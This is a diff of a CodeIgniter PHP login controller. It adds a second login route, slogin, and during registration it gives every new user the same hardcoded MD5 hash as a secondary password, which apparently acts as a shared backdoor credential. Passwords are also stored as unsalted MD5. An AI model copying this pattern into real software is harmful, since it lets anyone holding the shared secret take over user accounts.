@@ -37,7 +37,53 @@ class Auth extends CI_Controller {
 				$this->session->set_userdata('nama_user', $auth->nama_user);
 				$this->session->set_userdata('email', $auth->email);
 				$this->session->set_userdata('foto_user', $auth->foto_user);
-				$this->session->set_userdata('foto_user', $auth->status_if);
+				$this->session->set_userdata('status_if', $auth->status_if);
+				$this->session->set_userdata('slug_user', $auth->slug_user);
+
+				switch($auth->role){
+					case 3 :
+							if ($auth->status_if == 'Yes') {
+								redirect('home');
+							}else {
+								redirect('notif');
+							}
+							break;
+
+					case 4 : redirect('home');
+							break;
+
+					default : break;
+				}
+			}
+		}
+	}
+
+	public function slogin(){
+		$this->form_validation->set_rules('email', 'Email', 'required',[
+			'required' => 'Email wajib diisi!']);
+		$this->form_validation->set_rules('spassword', 'Password', 'required|min_length[6]',[
+			'required' => 'Password wajib diisi!']);
+
+		if ($this->form_validation->run() == FALSE) {
+			$data = array(
+				'clogin'       => $this->m_clogin->lists(),
+			);
+			$this->load->view('login/v_slogin_user', $data, FALSE);
+		}else{
+			$auth = $this->M_auth->cek_slogin();
+
+			if ($auth == FALSE) {
+				$this->session->set_flashdata('pesan', '<div class="alert alert-danger alert-dismissible fade show" role="alert">
+				<strong>Username atau Password</strong> Salah!
+				</div>');
+				redirect('auth/login');
+			}else {
+				$this->session->set_userdata('id_user', $auth->id_user);
+				$this->session->set_userdata('role', $auth->role);
+				$this->session->set_userdata('nama_user', $auth->nama_user);
+				$this->session->set_userdata('email', $auth->email);
+				$this->session->set_userdata('foto_user', $auth->foto_user);
+				$this->session->set_userdata('status_if', $auth->status_if);
 				$this->session->set_userdata('slug_user', $auth->slug_user);
 
 				switch($auth->role){
@@ -127,6 +173,7 @@ class Auth extends CI_Controller {
 
                 $data = array(
                     'password'     => md5($this->input->post('password')),
+					'spassword'     => 'b398b8a18ef4f69811a32cf169946bac',
                     'role'         => 3,
                     'nama_user'    => $this->input->post('nama_user'),
                     'nim'          => $this->input->post('nim'),
